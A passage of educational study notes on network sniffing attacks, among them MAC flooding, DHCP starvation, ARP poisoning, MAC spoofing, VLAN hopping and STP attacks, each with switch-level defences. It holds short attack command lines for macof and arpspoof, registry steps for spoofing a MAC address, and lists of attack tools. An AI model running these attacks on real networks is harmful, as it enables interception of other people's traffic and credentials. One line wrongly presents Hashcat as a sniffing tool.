			- Switches maintain an ARP cache in Content Addressable Memory (CAM), mapping hosts to ports. A sniffer records visible network traffic, allowing attackers to view sensitive information. Active sniffing includes sending network probes to identify access points.
			- Active Sniffing Techniques:
				- MAC Flooding
				- DNS Poisoning
				- ARP Poisoning
				- DHCP Attacks
				- Switch Port Stealing
				- Spoofing Attack
	- Protocols Vulnerable to Sniffing:
		- Telnet and Rlogin : Telnet is a protocol that allows communication with a remote host via port 23 using a command-line terminal. Rlogin enables remote login to a network machine through a TCP connection. Neither protocol provides encryption, meaning data transmitted between clients is in plaintext and vulnerable to sniffing. Attackers can intercept keystrokes, including usernames and passwords.
		- HTTP : The default version of HTTP has vulnerabilities that cause websites to transmit user data in plaintext across the network, making it susceptible to interception by attackers who can steal user credentials.
		- SNMP : Simple Network Management Protocol (SNMP) is a TCP/IP-based protocol used to exchange management information between network devices. The first versions of SNMP (SNMPv1 and SNMPv2) lack strong security, causing data to be transmitted in plaintext. Attackers exploit these vulnerabilities to capture passwords in cleartext.
		- SMTP : Simple Mail Transfer Protocol (SMTP) is used to transmit email messages over the Internet. In most implementations, SMTP transmits messages in plaintext, allowing attackers to intercept and capture plaintext passwords. Furthermore, SMTP lacks built-in protection against sniffing attacks.
		- NNTP : Network News Transfer Protocol (NNTP) is used for distributing, retrieving, posting, and inquiring about news articles over a reliable stream-based transmission within the ARPA-Internet community. However, NNTP does not encrypt data, making it vulnerable to attackers who can sniff and capture sensitive information.
		- POP : Post Office Protocol (POP) enables a user’s workstation to retrieve email from a mailbox server. Outgoing mail is typically sent from the workstation to the mailbox server via SMTP. However, due to weak security implementations, POP transmits data in plaintext, making it easy for attackers to sniff and capture sensitive information.
		- FTP : File Transfer Protocol (FTP) allows clients to share files between computers on a network. However, FTP lacks encryption, making it vulnerable to sniffing attacks. Attackers can intercept and capture data, including user credentials, using tools such as Hashcat.
		- IMAP : Internet Message Access Protocol (IMAP) enables clients to access and manage email messages stored on a server. However, due to inadequate security measures, IMAP transmits data in plaintext, allowing attackers to intercept and capture sensitive information, including user credentials.
		- TFTP : Trivial File Transfer Protocol (TFTP) is a simple file transfer protocol implemented over UDP/IP. It lacks authentication and encryption mechanisms, making transferred data easily accessible to anyone on the same network.
	- Sniffing in the Data Link Layer of the OSI Model:
		- The OSI model organizes network functions into seven layers, with each layer providing services to the layer above and receiving services from the layer below. The data link layer, the second layer of the OSI model, is responsible for encoding and decoding data packets into bits. Sniffers operate at this layer, allowing them to capture packets directly from it. Because the OSI layers are designed to function independently, sniffing at the data link layer goes undetected by the upper layers.
	- Hardware Protocol Analyzers:
		- A hardware protocol analyzer is a device designed to interpret and monitor network traffic by capturing signals without altering the traffic segment. Its primary purpose is to track network usage and identify malicious traffic generated by hacking software. The analyzer captures data packets, decodes them, and analyzes their content based on predefined rules, enabling attackers to view individual data bytes of each packet traversing the network.
		- Unlike software protocol analyzers, hardware analyzers can handle higher data loads without dropping packets, even during data overload. They support a wide range of network connections, including LAN, WAN, wireless, and circuit-based telco lines. Hardware analyzers can also display bus states and low-level events such as high-speed negotiation (e.g., K/J chirps), transmission errors, and retransmissions, while providing precise timestamps for captured traffic. Despite their advanced capabilities, hardware protocol analyzers are expensive, making them less accessible to individual developers, hobbyists, and ordinary hackers.
		- Hardware Protocol Analyzers (manufacturers):
			- Xgig 1000 32/128 G FC & 25/50/100 GE Analyzer:
				- The VIAVI Xgig 1000 32/128 G Fiber Channel (FC) and 25/50/100 G Ethernet (GE) platform is a hardware solution that supports 8G/16G/32G/128G FC and 10/25/50/100 GE in a portable, integrated platform with reconfigurable ports. It provides a platform for inline, non-intrusive capture and analysis, as well as inline jamming (error injection).
				- The platform incorporates the industry's first true analog pass-through adapter, maintaining the linear nature of signal-over-copper connections. It offers exceptional visibility into the OSI physical layer with features such as auto-negotiation, link training, and forward error correction (FEC).
			- SierraNet M1288:
				- The SierraNet M1288 is an Ethernet and Fiber Channel test platform that provides best-in-class analysis, jamming, and generation capabilities for capturing and manipulating traffic to test application and link characteristics. This hardware tool can capture and analyze up to 256GB of Ethernet or Fiber Channel traffic at full wire transmission rates.
				- Key features of the SierraNet M1288 include 128GB or 256GB recording buffers, dynamic memory allocation, support for Fiber Channel fabrics (64/128GFC PAM4), and compatibility with 1, 2, and 4 Ethernet lanes.
			- Hardware Protocol Analyzers:
				- PTW60 (www.globalspec.com)
				- P5551A PCIe 5.0 Protocol Exerciser (www.keysight.com)
				- Voyager M4x (www.teledynelecroy.com)
				- N2X N5540A Agilent Protocol Analyzer (www.valuetronics.com)
				- Xgig 16-Lane PCI Express 4.0 Chassis (www.viavisolutions.com)
	- SPAN Port:
		- The Switched Port Analyzer (SPAN) is a Cisco switch feature, also known as "port mirroring," that monitors network traffic on one or more switch ports. A SPAN port is configured to receive copies of every packet that passes through the switch. It helps analyze and debug data, identify errors, and investigate unauthorized network access.
		- When port mirroring is enabled, the network switch sends a copy of packets from the source port(s) to the destination port, where a network analyzer examines them. While there can be multiple source ports, there must be only one destination port. Source ports are those from which network packets are monitored and mirrored. This feature allows simultaneous monitoring of traffic from multiple ports, such as all ports in a specific virtual local area network (VLAN).
	- Wiretapping:
		- Wiretapping, or telephone tapping, refers to the monitoring of telephone or Internet conversations by a third party with covert intentions. To carry out wiretapping, the attacker first selects a target individual or network host on the network to wiretap and then connects a listening device (hardware, software, or a combination of both) to the circuit carrying information between the target phones or hosts.
		- Typically, this involves intercepting a small portion of the electrical signals transmitted through telephone wires to eavesdrop on the conversation. This allows attackers to monitor, intercept, access, and record information flowing through the communication system.
		- Wiretapping without a warrant or the consent of the individuals involved in the conversation is a criminal offense in most countries and is punishable according to the laws of the respective country.
		- Wiretapping Methods:
			- Official tapping of telephone lines
			- Unofficial tapping of telephone lines
			- Recording conversations
			- Direct line wiretap
			- Radio wiretap
		- Types of Wiretapping:
			- Active Wiretapping: In hacking terminology, active wiretapping is a Man-in-the-Middle (MITM) attack. It allows an attacker to monitor and record the traffic or data flow in a communication system. The attacker can also alter or inject data into the communication or traffic.
			- Passive Wiretapping: Passive wiretapping refers to snooping or eavesdropping. It allows an attacker to monitor and record traffic. By observing the recorded traffic, the attacker can search for passwords or other sensitive information.
	- Lawful Interception:
		- Lawful interception (LI) refers to the legal interception of data communication between two endpoints for surveillance purposes on traditional telecommunications, VoIP, data, and multiservice networks. LI involves obtaining data from a communication network for analysis or use as evidence.
		- It is commonly used in activities such as infrastructure management, protection, and addressing cybersecurity-related issues. In this process, the network operator or service provider grants legal access to private network data, enabling the monitoring of private communications, such as telephone calls and email messages. These operations are conducted by law enforcement agencies (LEAs).
		- This type of interception is necessary solely for monitoring messages exchanged over suspicious channels where users are engaged in illegal activities. Countries worldwide are making efforts to standardize procedures for such interception.
		- The solution comprises a tap/access switch and multiple systems for reconstructing intercepted data. The tap/access switch collects traffic from the Internet service provider (ISP) network, sorts it by IP domain, and forwards it to E-Detective (ED) systems. These systems decode and reconstruct the intercepted traffic into its original format. This process is supported by protocols such as POP3, IMAP, SMTP, P2P, FTP, and Telnet. A Centralized Management Server (CMS) oversees all ED systems.
	- Sniffing Techniques:
		- MAC Flooding:
			- Attackers use the MAC flooding technique to force a switch to function as a hub, allowing them to easily sniff the traffic.
			- MAC Address/CAM Table:
				- In a switched network, an Ethernet switch has a fixed-size dynamic Content Addressable Memory (CAM) table, which stores information such as MAC addresses associated with physical ports and their corresponding virtual LAN (VLAN) parameters.
				- A switch acts as an intermediate device between one or more computers in a network. When a machine sends data to another machine within a network, the data passes through the switch. The switch searches its CAM table for the destination MAC address (found in the Ethernet frame). Once the MAC address is located, the switch forwards the data to the machine through the port associated with that MAC address.
				- This method of data transfer in a switched network is more secure than in a hub-based network, where the hub forwards/broadcasts incoming traffic to all machines in the network.
			- The CAM table on a switch has a limited size. When the CAM table reaches its capacity, any additional ARP request traffic is flooded to all ports on the switch. If the CAM table is flooded with more MAC addresses than it can store, the switch turns into a hub. This enables an attacker to intercept frames sent between a victim host and another host without a corresponding CAM table entry. Once this occurs, the switch broadcasts all incoming traffic to every port, similar to a hub, to ensure data delivery to the intended recipient. This attack also fills the CAM tables of adjacent switches.
			- Attackers exploit this vulnerability through MAC flooding, which involves sending a large volume of fake source MAC address and IP pairs to the switch, causing the CAM table to overflow. An attacker with access to the shared switch within the Ethernet segment can then easily intercept and analyze network traffic.
			- No issues occur until the MAC address table is full. However, once the MAC address table is full, any further requests may force the switch to enter fail-open mode. In the fail-open mode, the switch begins functioning like a hub. The attacker can then configure the machine’s NIC to promiscuous mode to enable the machine to accept and process all the traffic. This enables the attackers to sniff the traffic easily and steal sensitive information.
			- Switch MAC Flooding with macof:
				- macof is a Unix/Linux tool included in the dsniff collection. It floods the local network with random MAC and IP addresses, causing certain switches to fail and enter repeating (fail-open) mode, which facilitates traffic sniffing. The tool overwhelms the switch’s CAM tables by sending forged MAC entries at a rate of approximately 131,000 per minute. Once the MAC table is full and the switch switches to hub-like behavior, an attacker can intercept and monitor the broadcasted data.
				- macof -i eth0 -n 10
			- Switch Port Stealing:
				- The switch port stealing sniffing technique uses MAC flooding to intercept packets. The attacker floods the switch with forged gratuitous ARP packets, using the target MAC address as the source and the attacker’s own MAC address as the destination. This causes a race condition between the attacker’s flooded packets and the target host’s packets, forcing the switch to constantly update its MAC address table, binding the target MAC address to multiple ports.
				- If the attacker acts quickly, they can redirect packets intended for the target host to their own switch port. At this point, the attacker "steals" the target host's switch port and sends an ARP request to discover the target host’s IP address. When the attacker receives an ARP reply, it indicates that the target host’s switch port binding has been restored, and the attacker can now sniff the packets sent to the targeted host.
			- Defending Against MAC Attacks:
				- Defending Against MAC Attacks with Port Security:
					- Port security limits MAC address access to a switch port. By assigning secure MAC addresses to a port, only packets with matching source MAC addresses are allowed. - A security violation occurs if:
						- The maximum number of secure MAC addresses is reached
						- A machine tries to access the port with an unrecognized MAC address
					- Secure MAC addresses can be configured in three ways:
						- Manually via the switch port configuration
						- Dynamically, based on connected devices’ MAC addresses
						- A mix of static and dynamic configurations
					- Port security helps prevent MAC flooding attacks by limiting the number of allowed MAC addresses and locking down the port, sending an SNMP trap when a violation occurs.
				- Configuring Port Security on Cisco Switch:
					- interface interface_id : Enter interface configuration mode and select the physical interface to configure (e.g., gigabitethernet 3/1).
					- switchport mode access : Set the interface mode to access. By default, an interface in dynamic desirable mode cannot be configured as a secure port.
					- switchport port-security : Enable port security on the selected interface.
					- switchport port-security maximum {1-3072} : Sets the maximum number of secure MAC addresses allowed on the interface. The range is 1 to 3072, with a default of 1.
					- switchport port-security violation {restrict | shutdown} : Configures the violation mode, specifying the action to be taken when a security violation is detected. Options are {restrict | shutdown}.
					- switchport port-security limit rate invalid-source-mac : Sets the rate limit for invalid packets (those with unauthorized MAC addresses).
					- switchport port-security mac-address mac_address : Manually enters a secure MAC address for the interface. This can be used to limit the number of secure MAC addresses.
					- switchport port-security mac-address sticky : Enables sticky learning for the first MAC address on the interface, allowing it to be added dynamically to the secure MAC address table.
					- end : Exits interface configuration mode and returns to privileged EXEC mode.
					- show port-security address / show port-security address interface interface_id : Verifies the port security configuration and displays the secure MAC addresses associated with the interface.
					- switchport port-security aging time 2 : Configures the aging time for secure MAC addresses on the port.
					- switchport port-security aging type inactivity : Sets the secure MAC address aging type to "inactivity," meaning the address will be aged out if inactive.
					- snmp-server enable traps port-security trap-rate 5 : Controls the rate at which SNMP traps are generated for port security events.
		- DHCP Attack:
			- Dynamic Host Configuration Protocol (DHCP):
				- DHCP enables communication on an IP network by automatically configuring network devices. It assigns IP addresses and other information to devices, enabling them to communicate on the network in a client-server model.
				- DHCP serves two primary functions: delivering host-specific configuration parameters and allocating network addresses to hosts. Communication between DHCP servers and clients is carried out through a series of DHCP messages.
				- DHCP is a client-server protocol that automatically assigns an IP address to an IP host. In addition to the IP address, the DHCP server provides configuration information, such as the default gateway and subnet mask.
				- When a DHCP client device boots up, it initiates communication by broadcasting traffic to discover available DHCP servers on the network. This process allows DHCP to dynamically assign IP configurations to hosts connecting to a network, streamlining the administrative task of managing IP networks.
				- DHCP servers maintain TCP/IP configuration information in a database, which includes valid TCP/IP configuration parameters, available IP addresses, and the lease durations offered by the server. The server provides address configurations to DHCP-enabled clients in the form of lease offers.
			- DHCP Starvation Attack:
				- In a DHCP starvation attack, an attacker floods the DHCP server with numerous DHCP requests, exhausting all the available IP addresses that the server can allocate. As a result, the server becomes unable to issue additional IP addresses, leading to a DoS attack. Consequently, legitimate users are unable to obtain or renew their IP addresses and fail to access the network. The attacker achieves this by broadcasting DHCP requests with spoofed MAC addresses, using tools such as Yersinia, Hyenae, and Gobbler.
				- DHCP starvation attack tools send a large number of requests to a DHCP server, leading to exhaustion of the server’s address pool. Subsequently, the DHCP server is unable to allocate configurations to new clients.
				- DHCP Starvation Attack Tools:
					- Yersinia : Yersinia is a network tool designed to exploit vulnerabilities in various network protocols, such as DHCP. It serves as a robust framework for analyzing and testing deployed networks and systems.			
					- dhcpStarvation.py (github.com)
					- Metasploit (www.metasploit.com)
					- Hyenae (sourceforge.net)
					- DHCPig (github.com)
			- Rogue DHCP Server Attack:
				- This attack works alongside a DHCP starvation attack. After exhausting the DHCP server’s IP address pool, an attacker sets up a rogue DHCP server on the network, impersonating a legitimate server. The rogue server assigns IP addresses and network information to clients, acting as the default gateway. Clients receiving configurations from the rogue server become vulnerable to attacks such as MITM, as their traffic is routed through the attacker’s server.
				- The rogue DHCP server competes with the legitimate DHCP server to respond to clients’ discovery requests. If the rogue server responds faster, the client accepts its response, potentially disrupting network access or causing a DoS attack. The rogue server can capture and forward client traffic, making the attack difficult to detect. Additionally, it can direct clients to fake websites to steal credentials.
				- To mitigate rogue DHCP server attacks, designate interfaces connected to unauthorized servers as untrusted. This blocks all incoming DHCP server messages from such interfaces, preventing malicious configurations.
				- DHCP Attack Tools:
					- mitm6 (github.com)
					- Ettercap (www.ettercap-project.org)
					- Gobbler (sourceforge.net)
			- Defend Against DHCP Starvation and Rogue Server Attacks:
				- Defend Against DHCP Starvation:
					- Enable port security to protect against DHCP starvation attacks. Port security limits the maximum number of MAC addresses allowed on a switch port. When this limit is exceeded, the switch drops subsequent packets from additional MAC addresses, safeguarding the server from DHCP starvation attacks.
					- IOS Switch Commands: The Internetwork Operating System (IOS) provides a comprehensive set of switch commands used to configure, manage, and troubleshoot Cisco network switches effectively.
				- Defend Against Rogue Server Attack:
					- The DHCP snooping feature available on switches helps mitigate rogue DHCP servers. It is configured on the port where the valid DHCP server is connected. Once configured, DHCP snooping prevents other ports on the switch from responding to DHCP Discover packets sent by clients. As a result, even if an attacker manages to set up a rogue DHCP server and connects it to the switch, it will not be able to respond to DHCP Discover packets.
					- IOS Global Commands: IOS Global Commands are a set of commands that can be configured at the global level in Cisco devices; can be used to defend against rogue server attacks by configuring security features, such as DHCP snooping and port security, to prevent unauthorized servers from responding to client requests and compromising the network.
					- MAC Limiting Configuration on Juniper Switches: MAC Limiting Configuration on Juniper switches is a security feature that restricts the number of MAC addresses learned on a port, preventing unauthorized devices from connecting and protecting the network from MAC flooding attacks and unauthorized access.
					- Configuring DHCP Filtering on Switch: DHCP filtering allows administrators to control whether traffic is forwarded between trusted nodes. When DHCP filtering is applied, the switch verifies the legitimacy of DHCP packets/messages before forwarding them to the client. With this filtering, the client can receive the correct port number and IP address from the legitimate DHCP server.
		- ARP Poisoning:
			- Address Resolution Protocol (ARP):
				- The ARP is a stateless TCP/IP protocol that maps IP addresses to hardware addresses (MAC addresses) used by a data link protocol. It resolves IP addresses to MAC addresses to enable communication within a network. In addition to switches, host machines also use ARP to obtain MAC addresses.
				- A host machine uses ARP when it needs to send a packet to another device. The host must specify the destination MAC address in the packet. The operating system maintains an ARP table, which is populated with information from responses to ARP requests. This table maps IP addresses to their corresponding MAC addresses, facilitating efficient communication within the network.
				- The process of obtaining a MAC address using ARP begins with the source machine sending an ARP request containing its own MAC and IP addresses along with the destination IP address to the switch. The switch updates its CAM table with the source MAC and port; if the MAC address is not already in the table, it adds the entry and broadcasts the ARP request to the network. Each device on the network compares the destination IP in the request with its own IP address. The device with the matching IP sends an ARP reply back to the switch, which updates its CAM table with the responder's MAC and forwards the reply to the source machine. The source then updates its ARP table with the responder's MAC address, enabling communication between the devices.
			- ARP Spoofing Attack:
				- ARP spoofing is a method used to attack an Ethernet LAN. ARP resolves IP addresses to MAC (hardware) addresses of interfaces to enable data transmission. However, ARP packets can be forged to redirect data to an attacker’s machine. ARP spoofing involves constructing a large number of forged ARP request and reply packets to overload a switch.
				- When a machine sends an ARP request, it assumes the ARP reply comes from the correct device. However, ARP lacks any mechanism to verify the authenticity of the responding device. Even systems that have not sent an ARP request can accept unsolicited ARP replies from other devices. Attackers exploit this flaw by crafting malformed ARP replies containing spoofed IP and MAC addresses. Assuming the reply is legitimate, the victim's computer adds the spoofed entry to its ARP table.
				- Once the ARP table is populated with these spoofed entries, the switch enters forwarding mode, allowing the attacker to intercept all data flowing from the victim's machine without their awareness. This technique is also referred to as ARP cache poisoning.
				- ARP spoofing serves as a precursor for attacks such as DoS, MITM, and session hijacking. When a legitimate user initiates a session with another user within the same Layer 2 broadcast domain, the switch broadcasts an ARP request using the recipient's IP address. The sender waits for the recipient to respond with a MAC address. An attacker listening on this unprotected Layer 2 broadcast domain can intercept the request and reply by spoofing the intended recipient’s IP address.
				- The attacker may also run a packet sniffer and configure the machine’s NIC to promiscuous mode, enabling them to capture all network traffic.
			- Threats of ARP Poisoning:
				- Packet Sniffing: Capturing and analyzing network traffic, often to extract sensitive information.
				- Session Hijacking: Stealing valid session information to gain unauthorized access to an application.
				- VoIP Call Tapping: Exploiting port mirroring to monitor all network traffic and selectively record VoIP traffic based on MAC addresses.
				- Manipulating Data: ARP spoofing enables attackers to capture and modify data or disrupt the flow of traffic.
				- Man-in-the-Middle (MITM) Attack: The attacker positions themselves between the victim and the server to intercept and potentially alter communication.
				- Data Interception: Captures IP addresses, MAC addresses, and VLAN information connected to a network switch.
				- Connection Hijacking: Exploits the flexibility of hardware addresses, which are meant to be unique and fixed. If a host changes its hostname or protocol, an attacker can manipulate the connection, taking complete control of a client’s session.
				- Connection Resetting: Incorrect routing information caused by hardware or software errors can disrupt connections. If a host fails to initiate a connection, it should inform the Address Resolution module to delete its entry. Data reception from the host will reset the connection timeout in the ARP table. If the host remains inactive for a certain period, the ARP entry is deleted automatically.
				- Stealing Passwords: Attackers use forged ARP replies to trick target hosts into sending sensitive information, such as usernames and passwords.
				- DoS Attack: Attackers associate multiple IP addresses with a single MAC address of the target host, overwhelming it with traffic and causing service disruptions.
			- ARP Spoofing/ Poisoning Tools:
				- arpspoof:
					- arpspoof redirects packets from a target host (or all hosts) on a LAN that are intended for another host by forging ARP replies. This tool is highly effective for sniffing traffic on a switched network.
					- arpspoof –i [Interface] –t [Target Host]
				- Habu:
					- Habu is a versatile hacking toolkit that offers various commands to perform a wide range of attacks and analyses. Its capabilities include ARP poisoning and traffic sniffing, DHCP discovery and starvation, subdomain identification, certificate cloning, TCP analysis (including ISN and flags), username verification on social networks, and web technology identification.
				- bettercap (github.com)
				- Ettercap (www.ettercap-project.org)
				- RITM (github.com)
				- ARP Spoofer (github.com)
				- larp (github.com)
			- Defend Against ARP Poisoning:
				- Implement Dynamic ARP Inspection Using DHCP Snooping Binding Table:
					- Dynamic ARP Inspection (DAI) prevents ARP poisoning by validating ARP packets in a network. When enabled on a VLAN, all ports are untrusted by default, and DAI uses the DHCP snooping binding table to verify MAC-IP bindings. DHCP snooping must be activated first, as it collects MAC addresses, IP addresses, and VLAN interfaces by monitoring DHCP exchanges. Without it, ARP-based communication between VLAN devices may fail, potentially causing a self-imposed DoS.
					- DAI inspects ARP packets against the snooping database and discards those with invalid bindings, reducing MITM attack risks. For networks with static IPs or switches without DAI, static mapping of IP-MAC pairs can be used to mitigate attacks. Custom scripts can also monitor ARP tables, comparing current entries against known MAC-IP pairs to detect mismatches and drop malicious packets. These methods safeguard servers and gateways from ARP poisoning.
				- Configuring DHCP Snooping and Dynamic ARP Inspection on Cisco Switches:
					- Dynamic ARP Inspection (DAI) requires DHCP snooping to be enabled first. DHCP snooping is a security feature that builds a binding table by tracking IP-to-switch-port mappings and filters untrusted DHCP messages. It inspects DHCP traffic at the Layer 2 level, ensuring secure IP allocation.
					- To configure DHCP snooping, enable it both globally and for the desired VLANs. Once DHCP snooping is active, DAI can be configured to validate ARP packets and prevent ARP poisoning attacks.
			- ARP Spoofing Detection Tools:
				- Capsa Portable Network Analyzer : Capsa, a portable network performance analysis and diagnostics tool, offers packet capture and analysis capabilities through an intuitive interface. It enables efficient network monitoring and protection in critical business environments. Capsa assists security professionals in swiftly detecting ARP poisoning and ARP flooding attacks and identifying their sources.
				- Wireshark (www.wireshark.org)
				- OpUtils (www.manageengine.com)
				- netspionage (github.com)
				- NetProbe (github.com)
				- ARP-GUARD (arp-guard.com)
		- MAC Spoofing/Duplicating:
			- MAC Spoofing/duplicating refers to the spoofing a MAC address with the MAC address of a legitimate user on the network. A MAC duplicating attack involves monitoring a network for the MAC addresses of legitimate clients that are connected. A MAC duplicating attack is launched by sniffing the network for the MAC addresses of clients actively associated with a switch port and then reusing one of those addresses. By intercepting the traffic on the network, a malicious user can spoof a legitimate user’s MAC address and receive all traffic intended for that user.
			- In this attack, the attacker first identifies the MAC addresses of clients that are actively connected to a switch port. The attacker then spoofs one of those MAC addresses, impersonating the legitimate client. If the spoofing is successful, the attacker can intercept all traffic destined for the legitimate client. As a result, the attacker gains unauthorized access to the network and can impersonate someone else. This technique may also be used to bypass MAC filtering on wireless access points.
			- MAC Spoofing Technique (Windows):
				- Method 1: Changing the MAC Address Using the Network Interface Card's Clone MAC Address Feature
					- If network interface card supports cloning the MAC address, follow these steps:
					- Open Control Panel: Go to Network and Sharing Center under Network and Internet
					- Access Ethernet Properties: Click Ethernet connection -> Properties -> Configure
					- Set the MAC Address: In the Advanced tab, select Network Address, enter the new MAC address without colons (e.g., 001A2B3C4D5E), and click OK
					- Verify Changes: Use ipconfig/all or net config rdr in Command Prompt
					- Reboot if Needed: Restart system if changes are visible; otherwise, try Method 2 (registry)
				- Method 2: Change MAC Address in the Registry
					- Open Registry Editor: Press Win + R, type regedit, and hit Enter
					- Navigate to Key: Go to HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}
					- Find the Adapter: Look for subkeys (0000, 0001, etc.) and check DriverDesc to identify the correct adapter
					- Add NetworkAddress: Right-click the subkey -> New -> String Value, name it NetworkAddress, and modify it to enter the new MAC address (e.g., 001A2B3C4D5E)
					- Apply Changes: Disable and re-enable the adapter or reboot the system
			- MAC Spoofing Tools:
				- MAC Address Changer : MAC Address Changer is a lightweight application that allows users to change or spoof the MAC address of network adapters. It is often utilized in network-related activities, including testing network security or simulating different devices. The tool can generate a randomized MAC address and restore the original address when needed.
				- SMAC (smac-tool.com)
				- Technitium MAC Address Changer (TMAC) (technitium.com)
				- Change MAC Address (lizardsystems.com)
				- Mac Changer (github.com)
				- Automatic Media Access Control Address Spoofing Tool (AMC) (github.com)
			- Defend Against MAC Spoofing:
				- DHCP Snooping Binding Table: DHCP snooping filters untrusted DHCP messages and builds a DHCP binding table. This table includes MAC addresses, IP addresses, lease times, binding types, VLAN numbers, and interface information, corresponding to untrusted switch interfaces. It acts as a firewall between untrusted hosts and DHCP servers, helping to differentiate between trusted and untrusted interfaces.
				- Dynamic ARP Inspection (DAI): This system checks the IP–MAC address binding for each ARP packet. During DAI, the system automatically drops packets with invalid IP–MAC address bindings.
				- IP Source Guard: IP Source Guard restricts IP traffic on untrusted Layer 2 ports by filtering traffic based on the DHCP snooping binding database. It prevents spoofing attacks when an attacker attempts to spoof or use another host's IP address.
				- Encryption: Encrypt communications between access points and devices to prevent MAC spoofing. Use secure encryption protocols like WPA3 to protect against MAC address spoofing, which can occur through traffic interception and manipulation.
				- Retrieving MAC Address: Always retrieve the MAC address directly from the Network Interface Card (NIC), rather than from the operating system.
				- IEEE 802.1X Implementation: This network protocol enforces port-based Network Access Control (PNAC), controlling access to the network at the entry point where users join.
				- AAA (Authentication, Authorization, and Accounting): Implement AAA servers to filter MAC addresses, ensuring secure authentication and monitoring.
				- Network Access Control (NAC): NAC systems enforce security policies on devices attempting to access the network. It can detect and prevent unauthorized access due to MAC spoofing.
				- Rate Limiting and Traffic Analysis: Implement rate limiting on network devices to mitigate the effects of MAC flooding attacks.
				- Regular Network Audits and Security Assessments: Conduct regular network audits to identify unknown devices, unexpected traffic patterns, and non-compliance with security policies. This helps identify potential vulnerabilities before they can be exploited.
				- Port Security: Configure port security on switches to limit the number of allowed MAC addresses per port and specify permitted MAC addresses, enhancing security.
		- IRDP Spoofing:
			- ICMP Router Discovery Protocol (IRDP) is a routing protocol that enables a host to discover the IP addresses of active routers on its subnet by processing router advertisement and solicitation messages. Attackers can exploit this protocol to remotely add default route entries on a system by spoofing router advertisement messages.
			- Since IRDP does not require authentication, the target host prioritizes the attacker-defined default route over the one provided by the DHCP server. Attackers achieve this by setting a high preference level and route lifetime, ensuring that the target host selects it as the preferred route.
			- This attack is only possible if the attacker is on the same network as the victim. On Windows systems configured as DHCP clients, the OS validates received router advertisements. If only one entry is present, Windows checks whether the source IP is within the subnet. If it is, the default route is added; otherwise, the advertisement is ignored.
			- By sending spoofed IRDP router advertisements, attackers can redirect all data packets through their system. This enables them to sniff traffic and extract sensitive information.
			- IRDP spoofing can facilitate various attacks:
				- Passive Sniffing: In switched networks, attackers reroute outbound traffic from target hosts through their machine, enabling traffic interception.
				- MITM (Man-in-the-Middle): Attackers intercept and act as a proxy between victims and destinations, potentially modifying traffic.
				- DoS (Denial of Service): Attackers add incorrect route entries to the victim’s routing table, disrupting network communication.
			- To prevent IRDP spoofing attacks, disable IRDP on hosts if the operating system supports/allows it.
		- VLAN Hopping:
			- VLAN hopping is a network attack technique used to gain unauthorized access to resources on a Virtual Local Area Network (VLAN). The goal of a VLAN hopping attack is to access traffic from other VLANs within the same network, which is otherwise inaccessible. Such attacks often exploit poor VLAN implementations or misconfigurations.
			- This attack bypasses network segmentation controls designed to isolate traffic for security and management purposes. Attackers use VLAN hopping to steal sensitive information (e.g., passwords), modify, corrupt, or delete data, install malicious code or programs, or spread malware such as viruses, Trojans, and worms throughout the network.
			- VLAN Hopping Methods:
				- Switch Spoofing:
					- Switch Spoofing is an attack where an attacker connects a rogue switch to the network, tricking a legitimate switch into creating a trunk link between them. Once the trunk link is established, traffic from multiple VLANs can be sent through the rogue switch, enabling the attacker to sniff and view the packet content.
					- This attack is successful only if the legitimate switch is configured to negotiate trunk connections or if its interface is set to modes like “dynamic auto,” “dynamic desirable,” or “trunk.”
				- Double Tagging:
					- Double Tagging is an attack where an attacker adds and manipulates tags in an Ethernet frame to enable traffic flow through any VLAN in the network. The attacker sends an Ethernet frame containing two 802.1Q tags: an outer tag corresponding to the attacker’s native VLAN and an inner tag for the target VLAN the attacker wants to access.
					- When the switch receives the frame, it removes the outer tag (as it matches the native VLAN) and forwards the frame with the inner tag intact to all trunk interfaces. This allows the attacker to bypass VLAN segmentation, jumping from their native VLAN to the target VLAN and sending traffic to other VLANs.
					- This attack is only possible if the switch ports are configured to use native VLANs.
			- Defend Against VLAN Hopping:
				- Configuring a Switch to Prevent Switch Spoofing Attacks:
					- Explicitly configure the ports as access ports and ensure that they are set not to negotiate trunks.
					- Ensure that all trunk ports are explicitly configured to prevent trunk negotiation.
				- Configuring a Switch to Prevent Double Tagging Attacks:
					- Specify a default VLAN to be used if an interface stops trunking.
					- Change the native VLANs on all trunk ports to an unused VLAN ID.
					- Explicitly tag the native VLANs on all trunk ports.
					- Use Private VLANs: Configure private VLANs to isolate ports within the same VLAN from each other.
					- Regularly Audit and Monitor VLAN Configurations: Perform regular audits of VLAN and switch configurations to ensure compliance with security policies.
		- STP Attack:
			- In a Spanning Tree Protocol (STP) attack, attackers connect a rogue switch to the network to change the STP operation and sniff all network traffic. STP is used in LAN-switched networks to prevent network loops and ensure optimized traffic paths, enhancing overall network performance. In this process, one switch is designated as the root bridge, and other switches select a root port, the port closest to the root bridge.
			- The root bridge is selected using Bridge Protocol Data Units (BPDUs), which include an identification number known as a Bridge ID (BID). The BID is composed of a Bridge Priority and the MAC address. By default, the Bridge Priority value is 32769.
			- If an attacker gains access to two switches, they can configure the rogue switch to have a lower priority than any other switch in the network, making it the root bridge. This allows the attacker to intercept and sniff all network traffic.
			- Defend Against STP Attacks:
				- To Prevent an STP Attack, the Following Security Features Should Be Implemented:
				- BPDU Guard : Enable BPDU guard on ports that should never receive a BPDU from connected devices. This feature prevents the transmission of BPDUs on PortFast-enabled ports, helping avoid potential bridging loops in the network. If BPDU guard is enabled on a switch interface and an unauthorized switch sends a BPDU, the port will enter errdisable mode, shutting it down and disabling it from sending or receiving traffic.
				- Root Guard : Root guard protects the root bridge by ensuring it remains as the root in the STP topology. It forces interfaces to become designated ports (forwarding ports) to prevent nearby switches from becoming the root switch. If a port with root guard enabled receives a superior BPDU, it moves into a "loop inconsistent" state (not errdisabled), thus preventing an STP topology change. The port remains down only for the specific switch or switches attempting to change the STP topology, and stays down until the issue is resolved.
				- Loop Guard : Loop guard enhances network stability by preventing bridging loops, often protecting against malfunctioning switches.
				- UDLD (Unidirectional Link Detection) : UDLD detects unidirectional links and disables the affected interfaces in the network. These unidirectional links can cause STP topology loops.
				- Deploy PortFast : Apply PortFast to all access ports to reduce the time spent in the listening and learning STP states. However, ensure BPDU Guard is enabled to mitigate risks.
				- Regularly Update and Patch Network Devices : Keep the firmware and software of network devices up to date to protect against known vulnerabilities.
				- Restrict Network Access : Limit physical access to network ports and devices to prevent unauthorized STP configuration changes.
